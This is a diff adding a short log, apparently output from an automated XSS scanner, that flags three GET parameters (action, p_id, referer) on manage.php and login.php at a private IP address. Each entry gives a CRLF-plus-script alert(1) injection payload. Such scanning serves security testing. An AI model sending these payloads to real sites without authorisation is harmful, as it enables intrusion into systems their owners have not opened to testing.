@@ -1,0 +1,9 @@
+Maybe there is a XSS in get parameter action!
+url: http://10.206.10.111/manage.php?action=re&p_id=1
+Payload : re\r\n\r\n<script>alert(1)</script>
+Maybe there is a XSS in get parameter p_id!
+url: http://10.206.10.111/manage.php?action=re&p_id=1
+Payload : 1\r\n\r\n<script>alert(1)</script>
+Maybe there is a XSS in get parameter referer!
+url: http://10.206.10.111/login.php?referer=%2Fpost.php%3Fedit%3Dtrue%26p_id%3D2
+Payload : %2Fpost.php%3Fedit%3Dtrue%26p_id%3D2\r\n\r\n<script>alert(1)</script>
